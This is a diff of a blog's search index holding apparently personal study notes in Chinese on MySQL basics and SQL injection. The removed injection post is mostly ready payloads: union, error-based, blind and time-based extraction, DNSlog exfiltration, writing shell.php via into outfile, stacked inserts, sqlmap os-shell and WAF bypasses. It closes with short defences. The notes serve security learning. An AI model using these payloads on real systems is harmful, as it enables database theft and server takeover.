@@ -1,273 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>数据库基础</title>
-    <url>/2026/05/21/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[1. 数据库核心概念1.1 什么是数据库数据库是长期存储在计算机内、有组织、可共享的数据集合，解决海量数据管理问题（对比Excel：支持上亿条数据、多人同时操作且保证数据不混乱）。
-数据库层级结构（类比学校）
-
-
-
-层级
-类比
-示例
-
-
-
-顶层：数据库
-整个学校
-school 库（存储校园所有数据）
-
-
-中层：数据表
-学校不同部门
-users 表、classes 表
-
-
-底层：字段+数据
-表头+行内容
-字段：id、name，数据：2025001、张三
-
-
-1.2 数据库管理系统（DBMS）数据库的”管家”，负责管理数据访问、存储规则，常见类型：
-
-Oracle：功能强、收费，银行&#x2F;电信常用
-SQL Server：适配Windows，政府单位常用
-MySQL：开源免费、轻巧，校园系统&#x2F;网站主流
-
-
-2. 数据库连接操作2.1 Navicat 可视化连接
-打开 Navicat → 左上角「连接」→ 选择「MySQL」
-填写核心信息：
-主机：localhost（本地数据库）
-端口：3306（MySQL 默认端口）
-用户名：root（超级管理员）
-密码：安装 MySQL 时设置的密码
-
-
-点击「测试连接」，提示”连接成功”即完成
-双击连接名，即可查看&#x2F;操作数据库
-
-2.2 命令行连接mysql -u root -p
-
--u：指定用户名
--p：需要输入密码（输入时不显示，属正常现象）
-回车后输入密码，再次回车即可登录
-
-
-3. 基础信息查询-- 当前数据库SELECT DATABASE();-- 数据库版本SELECT VERSION();
-
-
-4. DDL 库与表定义4.1 数据库操作SHOW DATABASES;                -- 查看所有库USE 数据库名;                   -- 切换数据库CREATE DATABASE 库名;           -- 创建库DROP DATABASE 库名;             -- 删除库
-
-4.1.1 创建 school 数据库（指定字符集）CREATE DATABASE school CHARACTER SET utf8 COLLATE utf8_general_ci;
-
-CHARACTER SET：指定字符集
-COLLATE：指定排序规则
-
-4.2 数据表操作SHOW TABLES;                    -- 查看当前库所有表DESC 表名;                      -- 查看表结构CREATE TABLE 表名(字段 类型…);   -- 创建表DROP TABLE 表名;                -- 删除表
-
-4.2.1 创建 users 学生表USE school;CREATE TABLE users (    id INT(11) PRIMARY KEY,            -- 主键，学号（唯一标识）    name VARCHAR(50) NOT NULL,         -- 姓名，非空    id_card VARCHAR(18) NOT NULL,      -- 身份证号    phone VARCHAR(11) NOT NULL,        -- 手机号    address TEXT,                       -- 地址    password VARCHAR(255) NOT NULL     -- 密码);
-
-
-5. DML 数据操作（增删改查）5.1 插入 INSERTINSERT INTO `school`.`users` (`id`, `name`, `id_card`, `phone`, `address`, `password`)VALUES (3, &#x27;shiro&#x27;, &#x27;123456789&#x27;, &#x27;123456789&#x27;, &#x27;中国&#x27;, &#x27;123456&#x27;);
-
-INSERT INTO 表名(字段1, 字段2)：指定新增数据的表和字段
-VALUES(值1, 值2)：批量填数据，顺序与字段对应
-
-5.2 查询 SELECT-- 查所有列SELECT * FROM 表名;-- 查指定列SELECT 字段1, 字段2 FROM 表名;-- 按条件查询SELECT name, password FROM users WHERE id = 1;-- 去重SELECT DISTINCT 字段 FROM 表名;-- 排序（ASC 升序默认 / DESC 降序）SELECT name FROM users ORDER BY id;SELECT name FROM users ORDER BY name DESC;-- 分页（从 n 开始取 m 条）SELECT * FROM users LIMIT 3;SELECT * FROM users LIMIT 1, 2;
-
-5.3 修改 UPDATEUPDATE users SET password = &#x27;newpass789&#x27; WHERE id = 2;
-注意：漏写 WHERE 会修改表中所有数据。
-5.4 删除 DELETEDELETE FROM users WHERE id = 1;
-同样，漏写 WHERE 会清空整张表，且难以恢复。
-
-6. 常用条件语法6.1 运算符
-
-
-类型
-语法
-说明
-
-
-
-比较
-= &gt; &lt; &gt;= &lt;= !=
-值比较
-
-
-逻辑
-AND OR NOT
-条件组合
-
-
-范围
-BETWEEN 小 AND 大
-区间筛选
-
-
-集合
-IN(值1, 值2)
-多值匹配
-
-
-6.1.1 AND（并且）：多个条件必须同时满足SELECT name, password FROM users WHERE id = 2 AND name = &#x27;xiaolin&#x27;;
-
-6.1.2 OR（或者）：满足任一条件即可SELECT * FROM users WHERE id = 2 OR id = 3;
-
-6.2 模糊查询LIKE &#x27;%字符%&#x27;  -- % 匹配任意多个字符LIKE &#x27;_字符_&#x27;  -- _ 匹配单个字符-- 示例SELECT * FROM users WHERE name LIKE &#x27;x%&#x27;;   -- 查姓 x 的学生
-
-
-7. 聚合函数（统计）
-
-
-函数
-作用
-
-
-
-COUNT()
-统计行数
-
-
-MAX()
-最大值
-
-
-MIN()
-最小值
-
-
-SUM()
-求和
-
-
-AVG()
-平均值
-
-
-
-8. 分组与筛选GROUP BY 字段;          -- 分组HAVING 条件;            -- 分组后条件过滤
-
-
-9. 联合查询 UNION将多个 SELECT 结果合并，前提：字段数相同、字段类型兼容。
-SELECT 列1, 列2 FROM 表1UNIONSELECT 列1, 列2 FROM 表2;-- UNION：合并结果并去重-- UNION ALL：保留重复数据
-
-
-10. SQL 注入漏洞10.1 万能密码10.1.1 漏洞根源$sql = &quot;SELECT * FROM users WHERE name=&#x27;$name&#x27; AND password=&#x27;$pwd&#x27;&quot;;
-
-直接将用户输入拼接到 SQL 语句的单引号中执行
-未检查&#x2F;过滤特殊字符（如 &#39;、OR、# 等），也未做转义处理
-攻击者可输入恶意字符篡改 SQL 逻辑
-
-10.1.2 攻击原理攻击者输入 123&#39; or &#39;1&#39;=&#39;1，实现 3 个关键操作：
-
-闭合原有 SQL 语句的单引号，打破查询限制
-添加 &#39;1&#39;=&#39;1&#39; 恒成立条件，让查询条件永远为真
-注释多余内容，避免 SQL 语法错误
-
-10.1.3 篡改后的 SQL 对比原正常 SQL：
-SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;123&#x27;
-
-篡改后 SQL：
-SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;123&#x27; or &#x27;1&#x27;=&#x27;1&#x27;
-
-无论账号密码是否正确，数据库都会返回所有用户信息，实现免密绕过。
-SELECT * FROM users WHERE name=&#x27;admin&#x27; or 1=1#&#x27; AND password=&#x27;123&#x27;
-
-10.2 CTF 注入常用语句10.2.1 核心系统库：information_schemaMySQL 自带系统字典库，储存所有数据库名、表名、字段名，注入查表必备。
-
-
-
-系统表
-存储内容
-
-
-
-schemata
-所有数据库信息
-
-
-tables
-所有数据表信息
-
-
-columns
-所有字段（列）信息
-
-
-
-
-
-关键字段
-含义
-
-
-
-schema_name
-数据库名
-
-
-table_schema
-表所属的数据库
-
-
-table_name
-数据表名
-
-
-column_name
-字段（列）名
-
-
-10.2.2 常用注入语句
-查看当前库、版本
-
-SELECT DATABASE();SELECT VERSION();
-
-
-查询所有数据库
-
-SELECT schema_name FROM information_schema.schemata;
-
-
-查询当前库所有表
-
-SELECT table_name FROM information_schema.tables WHERE table_schema = database();
-
-
-查询指定表所有字段
-
-SELECT column_name FROM information_schema.columns WHERE table_name = &#x27;表名&#x27;;
-
-
-探测字段数量
-
-ORDER BY 1;ORDER BY 2;-- 不报错代表存在，报错即为最大列数
-
-
-批量拼接爆库&#x2F;表&#x2F;字段
-
--- 爆出当前库所有表SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = database();-- 爆出指定表所有字段SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#x27;表名&#x27;;
-
-
-查询表内真实数据
-
-SELECT 字段1, 字段2 FROM 表名;SELECT * FROM 表名 LIMIT 0, 1;
-
-
-本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>SQL</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hello！</title>
     <url>/2026/05/19/hello-world/</url>
     <content><![CDATA[欢迎来到我的博客！这是我的第一篇文章。
@@ -479,430 +212,6 @@ Q9：CORS跨域漏洞是什么？CORS 跨域漏洞的产生原因是因为没有
       <tags>
         <tag>CSRF</tag>
         <tag>SSRF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入漏洞</title>
-    <url>/2026/05/23/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[1. 什么是 SQL 注入SQL注入是一种常见的网络安全漏洞和攻击方式，它利用应用程序对用户输入数据的处理不当，使得攻击者能够在执行SQL查询时插入恶意的SQL代码。通过成功注入恶意代码，攻击者可以执行未经授权的数据库操作，获取敏感信息、篡改数据甚至完全破坏数据库。
-SQL 注入就是：有人在网站的输入框（比如登录框、搜索框）里，不是输正常内容，而是偷偷塞一段 SQL 数据库命令，想骗数据库执行，达到偷数据、删数据甚至改网站的目的。
-
-2. SQL 注入分类常见的注入点：
-?str=xxx?test=xxx?idstr=xxx?id=xxx
-
-2.1 union 注入2.1.1 概念：union查询注入是最基础的注入。在SQL中， UNION 操作符用于合并两个或多个 SELECT 语句的结果。union 查询注入利用 UNION 关键字可以追加一条或者多条额外的 SELECT 查询，并将结果追加到原始查询中。联合查询会“纵向”拼接两个或多个 SELECT 语句的结果.
-2.1.2 适用条件：（1）网页存在注入点，有回显。
-（2）需要满足union语句要求，即：
-union前后两个select的结果集应具有相同列数；
-union前后两个select的结果集对应列应是相同数据类型
-2.1.3 注入步骤：
-首先判断是否存在注入点及注入的类型。
-
-https://地址/?id=1通过修改id的值判断是否存在注入点
-
-
-使用ORDER BY 查询列数
-
-https://地址/?id=1 order by 1修改 order by 后面的数据不报错代表存在，报错即为最大列数
-
-
-判断回显的位置
-
-?id=-1 union select 1,2,3注意：这里的id不可以填1，因为1是真实存在的，而我们不想查到真实存在的数据，所以要改成一个不存在的数：-1
-
-
-获取数据库名
-
-以三个字段数为例：
-?id=-1 union select 1,2,database()		//查询当前数据库?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata		// 查询所有数据库名
-
-
-获取数据库中的所有表名
-
-?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where tables_schema=&#x27;数据库名&#x27;
-
-
-获取数据库的表中的所有字段名
-
-?id=-1 union select 1,2,group_concat(colunm_name) from information_schema.colunms where tables_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;
-
-
-获取字段中的数据。
-
-?id=-1 union select 1,2,目标字段 from 目标表名 limit 0,1// 如果想要数据一一对应，使用concat将多个字段内容合并为输出// 例如：?id=-1 union select 1,2,concat(username, &#x27;:&#x27;, password) from users limit 0,1
-
-2.1.4 总结
-union 注入要求存在注入点，有回显
-需要满足 union 语句要求
-
-2.2 报错注入2.2.1 概念报错注⼊是利⽤⽹站的报错信息来带出我们想要的信息，就是在错误信息中执⾏sql语句
-2.2.2 使用条件考虑到成功率和时间成本⽐union成本⾼，需要数据库有错误信息，⼀般在union条件不能实施的时候，在查询，新增，修改能都使⽤
-2.2.3 报错注入命令该部分参考：https://cloud.tencent.com/developer/article/2159753
-groupby重复键冲突利⽤count()、rand()、floor()、groupby这⼏个特定的函数结合在⼀起产⽣的注⼊漏洞
-?id=1 and (select 1 from (select count(*),concat(0x5e,(目标查询语句),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
-
-核心是利用 count(*) + rand() + group by 触发主键重复错误，把 concat 包裹的目标数据（如版本号、表名）带出，无需页面回显也能拿到数据（当 union 被禁用时）。
-1、 命令解释
-1. `count(*)`
-
-统计有多少行数据，用来触发分组。
-2. `rand(0)`
-
-生成固定的随机数（不是真随机， predictable）
-3. `floor(rand(0)*2)`
-
-结果只有两个：0 或者 1
-4. `group by x`
-
-按 x 分组，MySQL 会建一张临时表存分组结果。
-5. `concat(0x5e, 数据, 0x5e)`
-
-把 版本号 &#x2F; 库名 &#x2F; 表名 拼进字符串里。
-- `0x5e` = **^** 符号，只是分隔符
-
-2、 问题：
-为什么会报错？
-MySQL 做 group by 时：
-
-先算 floor(rand(0)*2) → 得到 0 或 1
-把结果插入临时表
-插入时又算了一次 rand (0)
-两次结果不一样 → 出现重复键
-直接报错：Duplicate entry（重复条目）
-关键：**报错的时候，会把我们拼接的【数据】一起输出来！**数据就这样拿到了。
-
-为什么 rand (14) 更好？
-rand (14) 只需要 2 条数据就能触发冲突rand (0) 需要 3 条数据 才会报错。
-3、 总结
-
-用 rand() 生成 0&#x2F;1
-用 group by 建临时表
-插入时重复计算 rand ()
-产生重复键报错
-错误信息里带出我们要的数据
-
-3、 如何使用
-不懂原理知道如何使用即可，想查什么，就把 version() 换成：
-
-database() → 查库名
-table_name → 查表名
-column_name → 查字段
-password → 查数据
-
-示例：
-?id=1 and (select 1 from (select count(*),concat(0x5e,(select version() from information_schema.tables limit 0,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
-
-把想要的数据（这里是 version()）爆在报错信息里。
-xpath报错MySQL 有两个 XML 函数：extractvalue ()、updatexml ()
-只要给它不符合 XPath 语法的字符串，它就会报错，并把错误内容直接显示出来。
-extractvalue()?id=1 and extractvalue(1, concat(0x5c, (查询语句), 0x5c))
-
-
-作用：从 XML 里查数据。
-语法：
-
-extractvalue( XML文档, XPath路径 )
-
-updatexml()?id=1 and updatexml(1, concat(0x5e, (查询语句), 0x5e), 1)
-
-
-作用：修改 XML 里的数据。
-语法：
-
-updatexml( XML文档, XPath路径, 新值 )
-
-
-注意：
-
-updatexml() 仅能获取返回32位字符，对于长字符串需要分批次获取：
-&#x27; or updatexml(1,concat(0x5e,(select concat(name,&#x27;:&#x27;,substring(password,1,16)) from users limit 0,1),0x5e),1) or &#x27;&#x27; or updatexml(1,concat(0x5e,(select concat(name,&#x27;:&#x27;,substring(password,17)) from users limit 0,1),0x5e),1) or &#x27;
-
-0x5e、0x5c 是什么？
-0x5e → ^
-0x5c → ____
-
-作用：破坏 XPath 语法，强制报错。
-攻击语句INSERT INTO messages(字段1, 字段2, 字段3) VALUES (&#x27;&#x27;, &#x27;&#x27;, &#x27; 攻击语句 &#x27;);// 例如：$sql = &quot;INSERT INTO messages(`uname`,`title`,`content`) VALUES (&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27; or extractvalue(1, concat(0x5c, database(), 0x5c)) or &#x27;&#x27;)&quot;;
-
-
-获得数据库名字
-
-&#x27; or extractvalue(1, concat(0x5c, (select database() from information_schema.tables limit 0,1), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select database() from information_schema.tables limit 0,1), 0x5e), 1) or &#x27;
-
-
-获得表名
-
-&#x27; or extractvalue(1, concat(0x5c, (select group_concat(table_name) from information_schema.tables where table_schema=库名), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select group_concat(table_name) from information_schema.tables where table_schema=库名), 0x5e), 1) or &#x27;
-
-
-获得表的字段
-
-&#x27; or extractvalue(1, concat(0x5c, (select group_concat(column_name) from information_schema.columns where table_schema=库名 and table_name=表名), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select group_concat(column_name) from information_schema.columns where table_schema=库名 and table_name=表名), 0x5e), 1) or &#x27;
-
-
-获得数据
-
-&#x27; or extractvalue(1, concat(0x5c, (select concat(字段1,&#x27;:&#x27;,字段1) from 表名 limit 0,1), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select concat(字段2,&#x27;:&#x27;,密码2) from 表名 limit 0,1), 0x5e), 1) or &#x27;
-
-2.3 布尔盲注2.3.1 概念当改变浏览器传给后台SQL的参数后，浏览器没有显⽰对应内容也没有显⽰报错信息时，⽆法使⽤ union联合查询注⼊与报错注⼊，这时候可以试试看能否使⽤布尔注⼊
-2.3.2 使用条件⼀般情况下，当带⼊参数为真和假时，⻚⾯会有不同的反映，⽐如有⽆显⽰也是⼀种不同，布尔盲注就是根据这种不同来反推我们输⼊的条件是真还是假。
-2.3.3 注入步骤示例参数：库名 data、表名 users、字段 name、password
-
-判断是否存在布尔注入使用布尔条件，绕过真假不同条件的时候，页面有变化，可以考虑使用布尔注入。
-
-?id=2 and 1=1?id=2 and 1=2
-
-
-猜解数据库名
-
-a. 判断库名长度
-?id=1 and length(database())&lt;数值?id=1 and length(database())&gt;数值?id=1 and length(database())=数字
-
-示例（假设数据库名为 data）：
-?id=1 and length(database())&lt;5?id=1 and length(database())&gt;2?id=1 and length(database())=4		// true 说明数据库名的长度为4
-
-b. 逐字符猜库名可以使用ASCII码，甄别出数据库每一个字符
-
-
-数据库的名字⼀般都是a-z,A-Z组成，也可能出现数字、下划线等字符
-?id=1 and ascii(substr(database(),第几位,1))&lt;ASCII值?id=1 and ascii(substr(database(),第几位,1))&gt;ASCII值?id=1 and ascii(substr(database(),第几位,1))=ASCII值/*substr(database(), 第几位, 1)：表示从database()返回的字符串中，“第几位”，就是截取第几个字符。比如 data 中，d就是第一位*/?id=1 and ascii(substr(database(),1,1))&lt;123	// 122为z?id=1 and ascii(substr(database(),1,1))&gt;64	// 65为A
-
-示例（库名：data）：
-?id=1 and ascii(substr(database(),1,1))&lt;123	//true?id=1 and ascii(substr(database(),1,1))&gt;64	//true?id=1 and ascii(substr(database(),1,1))&gt;100	//true?id=1 and ascii(substr(database(),1,1))&gt;110	//false?id=1 and ascii(substr(database(),1,1))=100	//true 100对应d?id=1 and ascii(substr(database(),2,1))=97	//true 97对应a?id=1 and ascii(substr(database(),3,1))=116 //true 116对应t?id=1 and ascii(substr(database(),4,1))=97	//true 97对应a// 合起来库名就是data
-
-c. 验证库名
-?id=1 and database()=&#x27;库名&#x27;
-
-示例（库名：data）：
-?id=1 and database()=&#x27;data&#x27;
-
-
-猜解库内数据表
-
-a. 判断表数量
-?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;数值?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;数值?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())=数量	//知道有几个表
-
-b. 判断表名长度
-// 判断单张表?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;数值?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;数值?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 数字// 判断多张表：?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1))=长度// 偏移量：= 第几个表 / 第几个字段，从 0 开始数！//比如：-- 第1张表?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 0,1))=长度-- 第2张表?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 1,1))=长度
-
-示例（表名：users）：
-?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1))&lt;10?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1))&lt;5?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1)) = 5
-
-c. 逐字符猜解表名
-?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))&lt;ASCII值	//先判断范围?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))&gt;ASCII值	?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))=ASCII值	//再确定字符?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 偏移量,1),第几位,1))=ASCII值// 直接填爆出来的库名或者database()都可以
-
-示例（表名：users，以第一个字符 u 为例）：
-?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;100?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;120?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117	//true 117对应u 说明表名中有一个字母是u
-
-
-猜解表内字段
-
-a.  判断字段总数
-?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;)=数值
-
-更改数值，挨个测试，表名填自己想查询的表名。
-示例（假如 users 表里面有两个字段分别是 username 和  password）：
-?id=1 and (select count(column_name) from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27;)=2
-
-b. 判断字段名长度
-?id=1 and length((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 偏移量,1))=长度
-
-示例（查第一个字段名的长度）：
-?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&lt;10?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&lt;1?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))=8 // 第一个字段的长度是8个字符
-
-c. 逐字符猜字段名
-?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 偏移量,1),第几位,1))=ASCII值
-
-示例（以 username 为例，查第一个字符 u）：
-?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;100?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;110?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))=117
-
-
-猜解表中数据
-
-a. 判断数据长度
-?id=1 and (select LENGTH(字段名) from 表名 limit 0,1)=长度
-
-示例：假设获得username 字段第一行数据的内容长度为 2
-?id=1 and (select LENGTH(username) from users LIMIT 0,1)=5
-
-b. 逐字符猜数据内容
-?id=1 and ascii(substr((select 字段名 from 表名 limit 偏移量,1),第几位,1))=ASCII值
-
-示例：假设获得user字段第一行数据第一个字符内容
-?id=1 and ascii(substr((select name from users limit 0,1),1,1))=97?id=1 and ascii(substr((select name from users limit 0,1),2,1))=100
-
-2.4 延迟盲注2.4.1 概念也称延时注入、时间注入等，这种注入方式在传给后台的参数中，设置了一个if语句，当条件为真时执行sleep语句，条件为假时无执行语句，然后根据浏览器的响应时间来推测sleep语句是否被执行，进而推测if条件是否为真。延时盲注与布尔盲注的核心思想都是通过浏览器两种不同的响应来推测输入的条件的真假，布尔盲注是条件真假时页面会有不同显示，延时盲注则是显示结果真假只能从响应时间上进行推测。
-2.4.2 使用条件union、报错、布尔等搞不定的时候才考虑，效率极低。
-2.4.3 注入步骤示例参数：库名 data、表名 users、字段 name、password
-
-测试延时注入点
-
-?id=1 and sleep(秒数)
-
-示例：
-?id=1 and sleep(5)
-
-
-猜数据库名
-
-a. 判断库名长度
-?id=1 and if(length(database())=数值,sleep(5),1)
-
-示例：
-?id=1 and if(length(database())=4,sleep(5),1)
-
-b. 逐字符猜库名
-?id=1 and if(ascii(substr(database()),位数,1)=ASCII值,sleep(5),1)
-
-示例：
-?id=1 and if(ascii(substr(database(),1,1))=100,sleep(5),1)?id=1 and if(ascii(substr(database(),2,1))=97,sleep(5),1)
-
-
-猜数据表名
-
-a. 判断表名长度
-?id=1 and if(length((select table_name from information_schema.tables where table_schema=库名 limit 序号,1))=数值,sleep(5),1)
-
-示例（库名为 data，长度为 4）：
-?id=1 and if(length((select table_name from information_schema.tables where table_schema=data limit 0,1))=4,sleep(5),1)
-
-b. 逐字符猜表名
-?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
-
-示例：
-?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=data limit 0,1),1,1))=117,sleep(5),1)
-
-
-猜字段名
-
-a. 判断字段名长度
-?id=1 and if(length((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 序号,1))=数值,sleep(5),1)
-
-示例
-?id=1 and if(length((select column_name from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27; limit 0,1))=4,sleep(5),1)
-
-b. 逐字符猜字段
-?id=1 and if(ascii(substr((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
-
-示例：
-?id=1 and if(ascii(substr((select column_name from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27; limit 0,1),1,1))=110,sleep(5),1)
-
-
-猜表内数据
-
-?id=1 and if(ascii(substr((select 字段名 from 表名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
-
-示例：
-?id=1 and if(ascii(substr((select name from users limit 0,1),1,1))=97,sleep(5),1)
-
-注解
-
-序号：表 &#x2F; 字段排序，从 0 开始计数
-位数：字符串截取位置
-sleep (5)：条件成立延迟 5 秒响应
-
-2.5 DNSlog 盲注2.5.1 概念DNSlog盲注就是通过load_file函数发起请求，然后去DNSlog平台接收数据，需要用到load_file函数，就是需要用到root用户读写文件的功能。
-2.5.2 查看配置show VARIABLES like &#x27;secure_file_priv&#x27;
-
-
-secure_file_priv&#x3D;null 不允许导入导出
-secure_file_priv&#x3D;tmp&#x2F; 只能在tmp目录
-secure_file_priv&#x3D; 无限制
-
-2.5.3 有权限直接读取
-读取路径：
-
-?id=-1 union select 1,2,3,@@datadir
-
-
-读取文件：
-
-?id=-1 union select 1,2,3,load_file(&#x27;文件完整路径&#x27;)
-
-示例：（\ 转义）
-?id=-1 union select 1,2,3,load_file(&#x27;C:\\phpStudy\\WWW\\config.php&#x27;)
-
-
-写入文件：
-
-?id=-1 union select 1,2,3,&#x27;写入内容&#x27; into outfile &#x27;文件保存路径&#x27;
-
-示例：
-?id=-1 union select 1,2,3,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;C:\\phpStudy\\WWW\\shell.php&#x27;?id=-1 union select 1,2,3,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;C:/phpStudy/WWW/shell.php&#x27;
-
-2.5.4 采用 DNSlog 带外获取http://dnslog.cn/  
-
-
-实操：点击 Get SubDomain 获取域名 xgikzx.dnslog.cn  
-
-
-
-查当前库名
-
-?id=1 and load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.获取的域名/123&#x27;))
-
-注入后，点击网站的 Refresh Record 就会返回数据库名。
-
-查表名
-
-// 获取第一张表?id=1 and load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.获取的域名/123&#x27;))// 获取第二张表?id=1 and load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 1,1),&#x27;.获取的域名/123&#x27;))
-
-2.6 二次注入2.6.1 概念二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。
-2.6.2 实战
-碰撞用户，确认用户名 admin 存在
-注册用户名：admin&#39;#
-修改密码时执行SQL：
-
-update users set password=md5(&#x27;123456&#x27;) where name=&#x27;admin&#x27;#&#x27;
-
-admin&#39;#的密码没变，修改的是admin的密码
-2.7 堆叠注入2.7.1 概念在SQL数据库中，每条语句是以;分开的，堆叠注入就是一次性注入并执行多条语句（多语句之间以分号隔开）的注入方式。与 union 对比：union 联合查询注入执行的语句是有限的，可以用来执行查询语句。堆叠注入可以执行任意语句，比如增删改查。
-2.7.2 实战
-获取库名、表名、字段名、数据等信息
-构造攻击语句：
-
-?id=2;insert into users (name,password) values(&#x27;admin&#x27;,md5(&#x27;admin&#x27;));
-
-
-3. SQLMap工具运用
-官⽹：https://sqlmap.org/
-作⽤： sqlmap是⼀个开源的渗透测试⼯具，它可以⾃动化检测和利⽤SQL注⼊漏洞并接管数据库服务器。它有⼀个强⼤的检测引擎，许多适合于终极渗透测试的良好特性和众多的操作选项。注意：kali⾃带
-
-3.1 常用命令//检测漏洞sqlmap -u &#x27;http://xxx?id=2&#x27;//查询当前数据库sqlmap -u &#x27;url&#x27; --current-db//查当前库有哪些表名sqlmap -u &#x27;url&#x27; -D 库名 --tables//某表有哪些字段sqlmap -u &#x27;url&#x27; -D 库名 -T 表名 --columns//列出数据sqlmap -u &#x27;url&#x27; -D 库名 -T 表名 -C 字段 --dump//其他：//执行sqlsqlmap -u &#x27;url&#x27; --sql-shell//执行系统命令sqlmap -u &#x27;url&#x27; --os-shell//读取文件sqlmap -u &#x27;url&#x27; --file-read &quot;d:/e.txt&quot;
-
-3.2 绕过WAFsqlmap -u &#x27;url&#x27; --tamper=passdog.py
-
-
-4. SQL注入绕过4.1 提交方式更改GET 改 POST
-安全狗（WAF 防御）
-4.2 特殊字符绕过database/**/()
-
-4.3 参数污染?id=1/**&amp;id=-1 union select 1,2,3,4%23*/
-
-4.4 数据库特性绕过/*!44509select*/
-
-
-5. SQL注入防护
-过滤：限制长度、识别恶意关键字
-转义：用户输入当文本
-数据库权限控制、敏感数据加密
-预编译（参数化查询）
-
-
-6. 总结
-报错注入是在 union 注入在查询不到的情况下，才使用
-在使用报错注入的时候要关注报错注入的函数extractvalue()、updatexml()
-
-
-本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>SQL</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1346,6 +655,836 @@ Q5：怎么绕 WAF？挨个使用 audio、script、video、button标签、加密
       </tags>
   </entry>
   <entry>
+    <title>数据库基础</title>
+    <url>/2026/05/21/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[1. 数据库核心概念1.1 什么是数据库数据库是长期存储在计算机内、有组织、可共享的数据集合，解决海量数据管理问题（对比Excel：支持上亿条数据、多人同时操作且保证数据不混乱）。
+数据库层级结构（类比学校）
+
+
+
+层级
+类比
+示例
+
+
+
+顶层：数据库
+整个学校
+school 库（存储校园所有数据）
+
+
+中层：数据表
+学校不同部门
+users 表、classes 表
+
+
+底层：字段+数据
+表头+行内容
+字段：id、name，数据：2025001、张三
+
+
+1.2 数据库管理系统（DBMS）数据库的”管家”，负责管理数据访问、存储规则，常见类型：
+
